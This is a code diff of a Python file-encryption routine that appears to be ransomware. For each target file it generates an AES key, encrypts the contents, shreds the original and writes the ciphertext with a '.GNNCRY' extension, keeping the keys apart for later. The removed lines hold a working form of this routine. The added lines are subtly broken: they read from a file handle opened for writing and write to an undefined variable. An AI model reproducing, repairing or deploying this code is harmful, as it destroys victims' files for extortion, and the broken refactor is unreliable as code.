@@ -48,27 +48,27 @@ def encrypt_priv_key(msg, key):
 def start_encryption(files):
     AES_and_base64_path = []
     for found_file in files:
-        key = generate_keys.generate_key(128, True)
-        AES_obj = symmetric.AESCipher(key)
-
-        found_file = base64.b64decode(found_file)
-
         try:
             with open(found_file, 'rb') as f:
-                file_content = f.read()
+                new_file_name = found_file.decode('utf-8') + ".GNNCRY"
+                with open(new_file_name, 'wb') as f:
+                    key = generate_keys.generate_key(128, True)
+                    AES_obj = symmetric.AESCipher(key)
+
+                    found_file = base64.b64decode(found_file)
+
+                    file_content = f.read()
+
+                    encrypted = AES_obj.encrypt(file_content)
+                    utils.shred(found_file)
+
+                    ef.write(encrypted)
+
+                    base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
+
+                    AES_and_base64_path.append((key, base64_new_file_name))
         except:
             continue
-
-        encrypted = AES_obj.encrypt(file_content)
-        utils.shred(found_file)
-
-        new_file_name = found_file.decode('utf-8') + ".GNNCRY"
-        with open(new_file_name, 'wb') as f:
-            f.write(encrypted)
-
-        base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
-
-        AES_and_base64_path.append((key, base64_new_file_name))
     return AES_and_base64_path
 
 
